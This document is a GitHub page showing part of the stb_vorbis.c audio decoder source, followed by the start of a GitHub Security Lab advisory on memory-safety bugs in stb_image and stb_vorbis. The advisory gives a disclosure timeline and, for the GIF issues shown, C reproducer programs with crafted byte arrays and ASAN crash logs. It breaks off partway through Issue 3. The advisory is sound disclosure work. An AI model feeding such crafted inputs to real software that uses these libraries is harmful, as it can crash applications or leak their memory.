#ifndef STB\_VORBIS\_NO\_INTEGER\_CONVERSIONextern int stb\_vorbis\_get\_samples\_short\_interleaved(stb\_vorbis \*f, int channels, short \*buffer, int num\_shorts);extern int stb\_vorbis\_get\_samples\_short(stb\_vorbis \*f, int channels, short \*\*buffer, int num\_samples);#endif// gets num\_samples samples, not necessarily on a frame boundary--this requires// buffering so you have to supply the buffers. Applies the coercion rules above// to produce 'channels' channels. Returns the number of samples stored per channel;// it may be less than requested at the end of the file. If there are no more// samples in the file, returns 0.
#endif
//////// ERROR CODES
enum STBVorbisError{ VORBIS\_\_no\_error,
 VORBIS\_need\_more\_data=1, // not a real error
 VORBIS\_invalid\_api\_mixing, // can't mix API modes VORBIS\_outofmem, // not enough memory VORBIS\_feature\_not\_supported, // uses floor 0 VORBIS\_too\_many\_channels, // STB\_VORBIS\_MAX\_CHANNELS is too small VORBIS\_file\_open\_failure, // fopen() failed VORBIS\_seek\_without\_length, // can't seek in unknown-length file
 VORBIS\_unexpected\_eof=10, // file is truncated? VORBIS\_seek\_invalid, // seek past EOF
 // decoding errors (corrupt/invalid stream) -- you probably // don't care about the exact details of these
 // vorbis errors: VORBIS\_invalid\_setup=20, VORBIS\_invalid\_stream,
 // ogg errors: VORBIS\_missing\_capture\_pattern=30, VORBIS\_invalid\_stream\_structure\_version, VORBIS\_continued\_packet\_flag\_invalid, VORBIS\_incorrect\_stream\_serial\_number, VORBIS\_invalid\_first\_page, VORBIS\_bad\_packet\_type, VORBIS\_cant\_find\_last\_page, VORBIS\_seek\_failed, VORBIS\_ogg\_skeleton\_not\_supported};
#ifdef \_\_cplusplus}#endif
#endif // STB\_VORBIS\_INCLUDE\_STB\_VORBIS\_H//// HEADER ENDS HERE////////////////////////////////////////////////////////////////////////////////
#ifndef STB\_VORBIS\_HEADER\_ONLY
// global configuration settings (e.g. set these in the project/makefile),// or just set them in this file at the top (although ideally the first few// should be visible when the header file is compiled too, although it's not// crucial)
// STB\_VORBIS\_NO\_PUSHDATA\_API// does not compile the code for the various stb\_vorbis\_\*\_pushdata()// functions// #define STB\_VORBIS\_NO\_PUSHDATA\_API
// STB\_VORBIS\_NO\_PULLDATA\_API// does not compile the code for the non-pushdata APIs// #define STB\_VORBIS\_NO\_PULLDATA\_API
// STB\_VORBIS\_NO\_STDIO// does not compile the code for the APIs that use FILE \*s internally// or externally (implied by STB\_VORBIS\_NO\_PULLDATA\_API)// #define STB\_VORBIS\_NO\_STDIO
// STB\_VORBIS\_NO\_INTEGER\_CONVERSION// does not compile the code for converting audio sample data from// float to integer (implied by STB\_VORBIS\_NO\_PULLDATA\_API)// #define STB\_VORBIS\_NO\_INTEGER\_CONVERSION
// STB\_VORBIS\_NO\_FAST\_SCALED\_FLOAT// does not use a fast float-to-int trick to accelerate float-to-int on// most platforms which requires endianness be defined correctly.//#define STB\_VORBIS\_NO\_FAST\_SCALED\_FLOAT
// STB\_VORBIS\_MAX\_CHANNELS [number]// globally define this to the maximum number of channels you need.// The spec does not put a restriction on channels except that// the count is stored in a byte, so 255 is the hard limit.// Reducing this saves about 16 bytes per value, so using 16 saves// (255-16)\*16 or around 4KB. Plus anything other memory usage// I forgot to account for. Can probably go as low as 8 (7.1 audio),// 6 (5.1 audio), or 2 (stereo only).#ifndef STB\_VORBIS\_MAX\_CHANNELS#define STB\_VORBIS\_MAX\_CHANNELS 16 // enough for anyone?#endif
// STB\_VORBIS\_PUSHDATA\_CRC\_COUNT [number]// after a flush\_pushdata(), stb\_vorbis begins scanning for the// next valid page, without backtracking. when it finds something// that looks like a page, it streams through it and verifies its// CRC32. Should that validation fail, it keeps scanning. But it's// possible that \_while\_ streaming through to check the CRC32 of// one candidate page, it sees another candidate page. This #define// determines how many "overlapping" candidate pages it can search// at once. Note that "real" pages are typically ~4KB to ~8KB, whereas// garbage pages could be as big as 64KB, but probably average ~16KB.// So don't hose ourselves by scanning an apparent 64KB page and// missing a ton of real ones in the interim; so minimum of 2#ifndef STB\_VORBIS\_PUSHDATA\_CRC\_COUNT#define STB\_VORBIS\_PUSHDATA\_CRC\_COUNT 4#endif
// STB\_VORBIS\_FAST\_HUFFMAN\_LENGTH [number]// sets the log size of the huffman-acceleration table. Maximum// supported value is 24. with larger numbers, more decodings are O(1),// but the table size is larger so worse cache missing, so you'll have// to probe (and try multiple ogg vorbis files) to find the sweet spot.#ifndef STB\_VORBIS\_FAST\_HUFFMAN\_LENGTH#define STB\_VORBIS\_FAST\_HUFFMAN\_LENGTH 10#endif
// STB\_VORBIS\_FAST\_BINARY\_LENGTH [number]// sets the log size of the binary-search acceleration table. this// is used in similar fashion to the fast-huffman size to set initial// parameters for the binary search
// STB\_VORBIS\_FAST\_HUFFMAN\_INT// The fast huffman tables are much more efficient if they can be// stored as 16-bit results instead of 32-bit results. This restricts// the codebooks to having only 65535 possible outcomes, though.// (At least, accelerated by the huffman table.)#ifndef STB\_VORBIS\_FAST\_HUFFMAN\_INT#define STB\_VORBIS\_FAST\_HUFFMAN\_SHORT#endif
// STB\_VORBIS\_NO\_HUFFMAN\_BINARY\_SEARCH// If the 'fast huffman' search doesn't succeed, then stb\_vorbis falls// back on binary searching for the correct one. This requires storing// extra tables with the huffman codes in sorted order. Defining this// symbol trades off space for speed by forcing a linear search in the// non-fast case, except for "sparse" codebooks.// #define STB\_VORBIS\_NO\_HUFFMAN\_BINARY\_SEARCH
// STB\_VORBIS\_DIVIDES\_IN\_RESIDUE// stb\_vorbis precomputes the result of the scalar residue decoding// that would otherwise require a divide per chunk. you can trade off// space for time by defining this symbol.// #define STB\_VORBIS\_DIVIDES\_IN\_RESIDUE
// STB\_VORBIS\_DIVIDES\_IN\_CODEBOOK// vorbis VQ codebooks can be encoded two ways: with every case explicitly// stored, or with all elements being chosen from a small range of values,// and all values possible in all elements. By default, stb\_vorbis expands// this latter kind out to look like the former kind for ease of decoding,// because otherwise an integer divide-per-vector-element is required to// unpack the index. If you define STB\_VORBIS\_DIVIDES\_IN\_CODEBOOK, you can// trade off storage for speed.//#define STB\_VORBIS\_DIVIDES\_IN\_CODEBOOK
#ifdef STB\_VORBIS\_CODEBOOK\_SHORTS#error "STB\_VORBIS\_CODEBOOK\_SHORTS is no longer supported as it produced incorrect results for some input formats"#endif
// STB\_VORBIS\_DIVIDE\_TABLE// this replaces small integer divides in the floor decode loop with// table lookups. made less than 1% difference, so disabled by default.
// STB\_VORBIS\_NO\_INLINE\_DECODE// disables the inlining of the scalar codebook fast-huffman decode.// might save a little codespace; useful for debugging// #define STB\_VORBIS\_NO\_INLINE\_DECODE
// STB\_VORBIS\_NO\_DEFER\_FLOOR// Normally we only decode the floor without synthesizing the actual// full curve. We can instead synthesize the curve immediately. This// requires more memory and is very likely slower, so I don't think// you'd ever want to do it except for debugging.// #define STB\_VORBIS\_NO\_DEFER\_FLOOR
//////////////////////////////////////////////////////////////////////////////
#ifdef STB\_VORBIS\_NO\_PULLDATA\_API #define STB\_VORBIS\_NO\_INTEGER\_CONVERSION #define STB\_VORBIS\_NO\_STDIO#endif
#if defined(STB\_VORBIS\_NO\_CRT) && !defined(STB\_VORBIS\_NO\_STDIO) #define STB\_VORBIS\_NO\_STDIO 1#endif
#ifndef STB\_VORBIS\_NO\_INTEGER\_CONVERSION#ifndef STB\_VORBIS\_NO\_FAST\_SCALED\_FLOAT
 // only need endianness for fast-float-to-int, which we don't // use for pushdata
 #ifndef STB\_VORBIS\_BIG\_ENDIAN #define STB\_VORBIS\_ENDIAN 0 #else #define STB\_VORBIS\_ENDIAN 1 #endif
#endif#endif
#ifndef STB\_VORBIS\_NO\_STDIO#include <stdio.h>#endif
#ifndef STB\_VORBIS\_NO\_CRT #include <stdlib.h> #include <string.h> #include <assert.h> #include <math.h>
 // find definition of alloca if it's not in stdlib.h: #if defined(\_MSC\_VER) || defined(\_\_MINGW32\_\_) #include <malloc.h> #endif #if defined(\_\_linux\_\_) || defined(\_\_linux) || defined(\_\_sun\_\_) || defined(\_\_EMSCRIPTEN\_\_) || defined(\_\_NEWLIB\_\_) #include <alloca.h> #endif#else // STB\_VORBIS\_NO\_CRT #define NULL 0 #define malloc(s) 0 #define free(s) ((void) 0) #define realloc(s) 0#endif // STB\_VORBIS\_NO\_CRT
#include <limits.h>
#ifdef \_\_MINGW32\_\_ // eff you mingw: // "fixed": // http://sourceforge.net/p/mingw-w64/mailman/message/32882927/ // "no that broke the build, reverted, who cares about C": // http://sourceforge.net/p/mingw-w64/mailman/message/32890381/ #ifdef \_\_forceinline #undef \_\_forceinline #endif #define \_\_forceinline #ifndef alloca #define alloca \_\_builtin\_alloca #endif#elif !defined(\_MSC\_VER) #if \_\_GNUC\_\_ #define \_\_forceinline inline #else #define \_\_forceinline #endif#endif
#if STB\_VORBIS\_MAX\_CHANNELS > 256#error "Value of STB\_VORBIS\_MAX\_CHANNELS outside of allowed range"#endif
#if STB\_VORBIS\_FAST\_HUFFMAN\_LENGTH > 24#error "Value of STB\_VORBIS\_FAST\_HUFFMAN\_LENGTH outside of allowed range"#endif
#if 0#include <crtdbg.h>#define CHECK(f) \_CrtIsValidHeapPointer(f->channel\_buffers[1])#else#define CHECK(f) ((void) 0)#endif
#define MAX\_BLOCKSIZE\_LOG 13 // from specification#define MAX\_BLOCKSIZE (1 << MAX\_BLOCKSIZE\_LOG)
typedef unsigned char uint8;typedef signed char int8;typedef unsigned short uint16;typedef signed short int16;typedef unsigned int uint32;typedef signed int int32;
#ifndef TRUE#define TRUE 1#define FALSE 0#endif
typedef float codetype;
#ifdef \_MSC\_VER#define STBV\_NOTUSED(v) (void)(v)#else#define STBV\_NOTUSED(v) (void)sizeof(v)#endif
// @NOTE//// Some arrays below are tagged "//varies", which means it's actually// a variable-sized piece of data, but rather than malloc I assume it's// small enough it's better to just allocate it all together with the// main thing//// Most of the variables are specified with the smallest size I could pack// them into. It might give better performance to make them all full-sized// integers. It should be safe to freely rearrange the structures or change// the sizes larger--nothing relies on silently truncating etc., nor the// order of variables.
#define FAST\_HUFFMAN\_TABLE\_SIZE (1 << STB\_VORBIS\_FAST\_HUFFMAN\_LENGTH)#define FAST\_HUFFMAN\_TABLE\_MASK (FAST\_HUFFMAN\_TABLE\_SIZE - 1)
typedef struct{ int dimensions, entries; uint8 \*codeword\_lengths; float minimum\_value; float delta\_value; uint8 value\_bits; uint8 lookup\_type; uint8 sequence\_p; uint8 sparse; uint32 lookup\_values; codetype \*multiplicands; uint32 \*codewords; #ifdef STB\_VORBIS\_FAST\_HUFFMAN\_SHORT int16 fast\_huffman[FAST\_HUFFMAN\_TABLE\_SIZE]; #else int32 fast\_huffman[FAST\_HUFFMAN\_TABLE\_SIZE]; #endif uint32 \*sorted\_codewords; int \*sorted\_values; int sorted\_entries;} Codebook;
typedef struct{ uint8 order; uint16 rate; uint16 bark\_map\_size; uint8 amplitude\_bits; uint8 amplitude\_offset; uint8 number\_of\_books; uint8 book\_list[16]; // varies} Floor0;
typedef struct{ uint8 partitions; uint8 partition\_class\_list[32]; // varies uint8 class\_dimensions[16]; // varies uint8 class\_subclasses[16]; // varies uint8 class\_masterbooks[16]; // varies int16 subclass\_books[16][8]; // varies uint16 Xlist[31\*8+2]; // varies uint8 sorted\_order[31\*8+2]; uint8 neighbors[31\*8+2][2]; uint8 floor1\_multiplier; uint8 rangebits; int values;} Floor1;
typedef union{ Floor0 floor0; Floor1 floor1;} Floor;
typedef struct{ uint32 begin, end; uint32 part\_size; uint8 classifications; uint8 classbook; uint8 \*\*classdata; int16 (\*residue\_books)[8];} Residue;
typedef struct{ uint8 magnitude; uint8 angle; uint8 mux;} MappingChannel;
typedef struct{ uint16 coupling\_steps; MappingChannel \*chan; uint8 submaps; uint8 submap\_floor[15]; // varies uint8 submap\_residue[15]; // varies} Mapping;
typedef struct{ uint8 blockflag; uint8 mapping; uint16 windowtype; uint16 transformtype;} Mode;
typedef struct{ uint32 goal\_crc; // expected crc if match int bytes\_left; // bytes left in packet uint32 crc\_so\_far; // running crc int bytes\_done; // bytes processed in \_current\_ chunk uint32 sample\_loc; // granule pos encoded in page} CRCscan;
typedef struct{ uint32 page\_start, page\_end; uint32 last\_decoded\_sample;} ProbedPage;
struct stb\_vorbis{ // user-accessible info unsigned int sample\_rate; int channels;
 unsigned int setup\_memory\_required; unsigned int temp\_memory\_required; unsigned int setup\_temp\_memory\_required;
 char \*vendor; int comment\_list\_length; char \*\*comment\_list;
 // input config#ifndef STB\_VORBIS\_NO\_STDIO FILE \*f; uint32 f\_start; int close\_on\_free;#endif
 uint8 \*stream; uint8 \*stream\_start; uint8 \*stream\_end;
 uint32 stream\_len;
 uint8 push\_mode;
 // the page to seek to when seeking to start, may be zero uint32 first\_audio\_page\_offset;
 // p\_first is the page on which the first audio packet ends // (but not necessarily the page on which it starts) ProbedPage p\_first, p\_last;
 // memory management stb\_vorbis\_alloc alloc; int setup\_offset; int temp\_offset;
 // run-time results int eof; enum STBVorbisError error;
 // user-useful data
 // header info int blocksize[2]; int blocksize\_0, blocksize\_1; int codebook\_count; Codebook \*codebooks; int floor\_count; uint16 floor\_types[64]; // varies Floor \*floor\_config; int residue\_count; uint16 residue\_types[64]; // varies Residue \*residue\_config; int mapping\_count; Mapping \*mapping; int mode\_count; Mode mode\_config[64]; // varies
 uint32 total\_samples;
 // decode buffer float \*channel\_buffers[STB\_VORBIS\_MAX\_CHANNELS]; float \*outputs [STB\_VORBIS\_MAX\_CHANNELS];
 float \*previous\_window[STB\_VORBIS\_MAX\_CHANNELS]; int previous\_length;
 #ifndef STB\_VORBIS\_NO\_DEFER\_FLOOR int16 \*finalY[STB\_VORBIS\_MAX\_CHANNELS]; #else float \*floor\_buffers[STB\_VORBIS\_MAX\_CHANNELS]; #endif
 uint32 current\_loc; // sample location of next frame to decode int current\_loc\_valid;
 // per-blocksize precomputed data
 // twiddle factors float \*A[2],\*B[2],\*C[2]; float \*window[2]; uint16 \*bit\_reverse[2];
 // current page/packet/segment streaming info uint32 serial; // stream serial number for verification int last\_page; int segment\_count; uint8 segments[255]; uint8 page\_flag; uint8 bytes\_in\_seg; uint8 first\_decode; int next\_seg; int last\_seg; // flag that we're on the last segment int last\_seg\_which; // what was the segment number of the last seg? uint32 acc; int valid\_bits; int packet\_bytes; int end\_seg\_with\_known\_loc; uint32 known\_loc\_for\_packet; int discard\_samples\_deferred; uint32 samples\_output;
 // push mode scanning int page\_crc\_tests; // only in push\_mode: number of tests active; -1 if not searching#ifndef STB\_VORBIS\_NO\_PUSHDATA\_API CRCscan scan[STB\_VORBIS\_PUSHDATA\_CRC\_COUNT];#endif
 // sample-access int channel\_buffer\_start; int channel\_buffer\_end;};
#if defined(STB\_VORBIS\_NO\_PUSHDATA\_API) #define IS\_PUSH\_MODE(f) FALSE#elif defined(STB\_VORBIS\_NO\_PULLDATA\_API) #define IS\_PUSH\_MODE(f) TRUE#else #define IS\_PUSH\_MODE(f) ((f)->push\_mode)#endif
typedef struct stb\_vorbis vorb;
static int error(vorb \*f, enum STBVorbisError e){ f->error = e; if (!f->eof && e != VORBIS\_need\_more\_data) { f->error=e; // breakpoint for debugging } return 0;}
// these functions are used for allocating temporary memory// while decoding. if you can afford the stack space, use// alloca(); otherwise, provide a temp buffer and it will// allocate out of those.
#define array\_size\_required(count,size) (count\*(sizeof(void \*)+(size)))
#define temp\_alloc(f,size) (f->alloc.alloc\_buffer ? setup\_temp\_malloc(f,size) : alloca(size))#define temp\_free(f,p) (void)0#define temp\_alloc\_save(f) ((f)->temp\_offset)#define temp\_alloc\_restore(f,p) ((f)->temp\_offset = (p))
#define temp\_block\_array(f,count,size) make\_block\_array(temp\_alloc(f,array\_size\_required(count,size)), count, size)
// given a sufficiently large block of memory, make an array of pointers to subblocks of itstatic void \*make\_block\_array(void \*mem, int count, int size){ int i; void \*\* p = (void \*\*) mem; char \*q = (char \*) (p + count); for (i=0; i < count; ++i) { p[i] = q; q += size; } return p;}
static void \*setup\_malloc(vorb \*f, int sz){ sz = (sz+7) & ~7; // round up to nearest 8 for alignment of future allocs. f->setup\_memory\_required += sz; if (f->alloc.alloc\_buffer) { void \*p = (char \*) f->alloc.alloc\_buffer + f->setup\_offset; if (f->setup\_offset + sz > f->temp\_offset) return NULL; f->setup\_offset += sz; return p; } return sz ? malloc(sz) : NULL;}
static void setup\_free(vorb \*f, void \*p){ if (f->alloc.alloc\_buffer) return; // do nothing; setup mem is a stack free(p);}
static void \*setup\_temp\_malloc(vorb \*f, int sz){ sz = (sz+7) & ~7; // round up to nearest 8 for alignment of future allocs. if (f->alloc.alloc\_buffer) { if (f->temp\_offset - sz < f->setup\_offset) return NULL; f->temp\_offset -= sz; return (char \*) f->alloc.alloc\_buffer + f->temp\_offset; } return malloc(sz);}
static void setup\_temp\_free(vorb \*f, void \*p, int sz){ if (f->alloc.alloc\_buffer) { f->temp\_offset += (sz+7)&~7; return; } free(p);}
#define CRC32\_POLY 0x04c11db7 // from spec
static uint32 crc\_table[256];static void crc32\_init(void){ int i,j; uint32 s; for(i=0; i < 256; i++) { for (s=(uint32) i << 24, j=0; j < 8; ++j) s = (s << 1) ^ (s >= (1U<<31) ? CRC32\_POLY : 0); crc\_table[i] = s; }[View remainder of file in raw view](https://github.com/nothings/stb/raw/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from securitylab.github.com_10bfe28f_20250111_170027.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

October 19, 2023
# GHSL-2023-145\_GHSL-2023-151/GHSL-2023-165\_GHSL-2023-172: Several memory access violations in stb\_image and stb\_vorbis

[![Author avatar](https://avatars.githubusercontent.com/u/26652396)
Jaroslav Lobačevski](https://github.com/jarlob)

## Coordinated Disclosure Timeline

* 2023-07-13: stb\_image report with issues and fix suggestions was sent privately to the maintainers.
* 2023-07-13/17: Created public pull requests for additional issues such as memory leaks.
* 2023-07-17: stb\_vorbis report with issues and fix suggestions was sent privately to the maintainers.
* 2023-07-17: Requested confirmation of report receipt.
* 2023-07-17: Received confirmation.
* 2023-09-05: Requested update on reported issues. No reply received.
* 2023-09-22: Requested update on reported issues. No reply received.
* 2023-10-09: Followed up with offer to create public pull requests for all reported issues. No reply received.
* 2023-10-19: Created pull requests for security related issues.
* 2023-10-19: Publishing according to our [coordinated disclosure policy](https://securitylab.github.com/disclosures#policy).

## Summary

[stb\_image.h](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h) and [stb\_vorbis](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c) libraries contain several memory access violations of different severity.

1. [Wild address read in stbi\_\_gif\_load\_next (`GHSL-2023-145`).](#issue-1-wild-address-read-in-stbi__gif_load_next-ghsl-2023-145)
2. [Multi-byte read heap buffer overflow in `stbi__vertical_flip` (`GHSL-2023-146`).](#issue-2-multi-byte-read-heap-buffer-overflow-in-stbi__vertical_flip-ghsl-2023-146)
3. [Disclosure of uninitialized memory in `stbi__tga_load` (`GHSL-2023-147`).](#issue-3-disclosure-of-uninitialized-memory-in-stbi__tga_load-ghsl-2023-147)
4. [Double-free in `stbi__load_gif_main_outofmem` (`GHSL-2023-148`).](#issue-4-double-free-in-stbi__load_gif_main_outofmem-ghsl-2023-148)
5. [Null pointer dereference in `stbi__convert_format` (`GHSL-2023-149`).](#issue-5-null-pointer-dereference-in-stbi__convert_format-ghsl-2023-149)
6. [Possible double-free or memory leak in `stbi__load_gif_main` (`GHSL-2023-150`).](#issue-6-possible-double-free-or-memory-leak-in-stbi__load_gif_main-ghsl-2023-150)
7. [Null pointer dereference because of an uninitialized variable (`GHSL-2023-151`).](#issue-7-null-pointer-dereference-because-of-an-uninitialized-variable-ghsl-2023-151)
8. [`0` byte write heap buffer overflow in `start_decoder` (`GHSL-2023-165`)](#issue-8-0-byte-write-heap-buffer-overflow-in-start_decoder-ghsl-2023-165)
9. [Multi-byte write heap buffer overflow in `start_decoder` (`GHSL-2023-166`)](#issue-9-multi-byte-write-heap-buffer-overflow-in-start_decoder-ghsl-2023-166)
10. [Heap buffer out of bounds write in `start_decoder` (`GHSL-2023-167`)](#issue-10-heap-buffer-out-of-bounds-write-in-start_decoder-ghsl-2023-167)
11. [Off-by-one heap buffer write in `start_decoder` (`GHSL-2023-168`)](#issue-11-off-by-one-heap-buffer-write-in-start_decoder-ghsl-2023-168)
12. [Attempt to free an uninitialized memory pointer in `vorbis_deinit` (`GHSL-2023-169`)](#issue-12-attempt-to-free-an-uninitialized-memory-pointer-in-vorbis_deinit-ghsl-2023-169)
13. [Null pointer dereference in `vorbis_deinit` (`GHSL-2023-170`)](#issue-13-null-pointer-dereference-in-vorbis_deinit-ghsl-2023-170)
14. [Out of bounds heap buffer write (`GHSL-2023-171`)](#issue-14-out-of-bounds-heap-buffer-write-ghsl-2023-171)
15. [Wild address read in `vorbis_decode_packet_rest` (`GHSL-2023-172`)](#issue-15-wild-address-read-in-vorbis_decode_packet_rest-ghsl-2023-172)

## Product

[stb\_image.h](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h) and [stb\_vorbis](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c)

## Tested Version

stb\_image - [v2.28](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h)

stb\_vorbis - [v1.22](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c)

## Details

### Issue 1: Wild address read in stbi\_\_gif\_load\_next (`GHSL-2023-145`)

A crafted image file may trigger out of bounds [`memcpy`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L6817) read in `stbi__gif_load_next`. This happens because [`two_back` points to a memory address lower than the start of the buffer `out`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L7021-L7022).

#### Impact

This issue may be used to leak internal memory allocation information.
s

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include <stdint.h>
#define STB_IMAGE_IMPLEMENTATION
#include "../stb_image.h"

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x47,0x49,0x46,0x38,0x39,0x61,0xbd,0x00,0xdf,0x79,0xa9,0x97,0x53,
                            0x43,0x05,0xff,0xbe,0x21,0x00,0x30,0x03,0x01,0x00,0x21,0x00,0x2c,
                            0x00,0x00,0x00,0x00,0xbd,0x00,0x3f,0x71,0x07,0x00,0x05,0xff,0xbe,
                            0x01,0x00,0x68,0x00,0x21,0xf9,0x04,0x2c,0x0a,0x00,0x1f,0x00,0x2c,
                            0x00,0x00,0x00,0x00,0xbd,0x00,0x71,0x00,0x00,0x05,0xff,0xe0,0x27,
                            0x8e,0x64,0x68};
    size_t size = sizeof(data);

    int x, y, z, channels;
    stbi_uc *img = stbi_load_gif_from_memory(data, size, NULL, &x, &y, &z, &channels, 4);
    stbi_image_free(img);
    return 0;
}

```

1. Run the program to hit the error.

```
AddressSanitizer:DEADLYSIGNAL
=================================================================
==34019==ERROR: AddressSanitizer: SEGV on unknown address 0x7efdf91e0ae8 (pc 0x7efe05a0ac23 bp 0x7ffd4ee08700 sp 0x7ffd4ee07ec8 T0)
==34019==The signal is caused by a READ memory access.
    #2 0x4e4156 in stbi__gif_load_next(stbi__context*, stbi__gif*, int*, int, unsigned char*) tests/../stb_image.h:6817:16
    #3 0x4dee75 in stbi__load_gif_main(stbi__context*, int**, int*, int*, int*, int*, int) tests/../stb_image.h:6983:14
    #4 0x4de8bd in stbi_load_gif_from_memory tests/../stb_image.h:1448:30

```
### Issue 2: Multi-byte read heap buffer overflow in `stbi__vertical_flip` (`GHSL-2023-146`)

When `stbi_set_flip_vertically_on_load` is set to `TRUE` and `req_comp` is set to a number that doesn’t match the real number of components per pixel, the library attempts to flip the image vertically.

```
stbi_set_flip_vertically_on_load(1);
stbi_uc *img = stbi_load_gif_from_memory(data, size, &delays, &x, &y, &z, &channels, 2);

```

A crafted image file can trigger [memcpy](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1235) [3] out-of-bounds read because `bytes_per_pixel` [1] used to calculate `bytes_per_row` [2] doesn’t match the real `image` array dimensions.

```
static void stbi__vertical_flip(void *image, int w, int h, int bytes_per_pixel /* [1] */)
{
   int row;
   size_t bytes_per_row = (size_t)w * bytes_per_pixel; // [2]
   stbi_uc temp[2048];
   stbi_uc *bytes = (stbi_uc *)image;

   for (row = 0; row < (h>>1); row++) {
      stbi_uc *row0 = bytes + row*bytes_per_row;
      stbi_uc *row1 = bytes + (h - row - 1)*bytes_per_row;
      // swap row0 with row1
      size_t bytes_left = bytes_per_row;
      while (bytes_left) {
         size_t bytes_copy = (bytes_left < sizeof(temp)) ? bytes_left : sizeof(temp);
         memcpy(temp, row0, bytes_copy);
         memcpy(row0, row1, bytes_copy); // [3] OOB
         memcpy(row1, temp, bytes_copy);
         row0 += bytes_copy;
         row1 += bytes_copy;
         bytes_left -= bytes_copy;
      }
   }
}

```

The reason for this is that [`stbi_load_gif_from_memory`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1442C4-L1451) calls [`stbi__vertical_flip_slices`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1245) [5] with the number of bytes per pixel in the loaded image - `comp`, however `stbi__load_gif_main` [4] internally [converts the image](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L7037-L7038) to requested number of bytes per pixel.

```
STBIDEF stbi_uc *stbi_load_gif_from_memory(stbi_uc const *buffer, int len, int **delays, int *x, int *y, int *z, int *comp, int req_comp)
{
   unsigned char *result;
   stbi__context s;
   stbi__start_mem(&s,buffer,len);

   result = (unsigned char*) stbi__load_gif_main(&s, delays, x, y, z, comp, req_comp); // [4]
   if (stbi__vertically_flip_on_load) {
      stbi__vertical_flip_slices( result, *x, *y, *z, *comp ); // [5]
   }

   return result;
}

```

```
static void *stbi__load_gif_main(stbi__context *s, int **delays, int *x, int *y, int *z, int *comp, int req_comp)
{
...
      // do the final conversion after loading everything;
      if (req_comp && req_comp != 4)
         out = stbi__convert_format(out, 4, req_comp, layers * g.w, g.h);

```
#### Impact

This issue may be used to leak internal memory allocation information.

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include <stdint.h>
#define STB_IMAGE_IMPLEMENTATION
#include "../stb_image.h"

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x47,0x49,0x46,0x38,0x39,0x61,0xbd,0x00,0xdf,0x79,0xa9,0x97,
                            0x66,0x4f,0x4e,0x4c,0xda,0x21,0xf9,0x04,0x09,0x0a,0x00,0x1f,
                            0x00,0x2c};
    size_t size = sizeof(data);

    stbi_set_flip_vertically_on_load(1);

    int x, y, z, channels;
    stbi_uc *img = stbi_load_gif_from_memory(data, size, NULL, &x, &y, &z, &channels, 2);
    stbi_image_free(img);
    return 0;
}

```

1. Run the program to hit the error.

```
==58950==ERROR: AddressSanitizer: heap-use-after-free on address 0x7f5f9fe18b98 at pc 0x00000049db51 bp 0x7ffdf2aed0f0 sp 0x7ffdf2aec8c0
READ of size 756 at 0x7f5f9fe18b98 thread T0
    #0 0x49db50 in __asan_memcpy /src/llvm-project/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cpp:22:3
    #1 0x4e2608 in stbi__vertical_flip(void*, int, int, int) tests/../stb_image.h:1235:10
    #2 0x4dfaee in stbi__vertical_flip_slices(void*, int, int, int, int) tests/../stb_image.h:1252:7
    #3 0x4dea9b in stbi_load_gif_from_memory tests/../stb_image.h:1450:7

```
### Issue 3: Disclosure of uninitialized memory in `stbi__tga_load` (`GHSL-2023-147`)

The [`stbi__getn`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1664) function reads a specified number of bytes from `context` (typically a file) into the specified buffer. In case the file stream points to the end, it returns zero. There are two places where its return value is not checked:

1. In [`stbi__hdr_load`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L7221)
2. In [`stbi__tga_load`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L5936C10-L5936C20)

The first case is harder to exploit because the initialized memory is mixed in different arithmetic operations:

```
static void stbi__hdr_convert(float *output, stbi_uc *input, int req_comp)
{
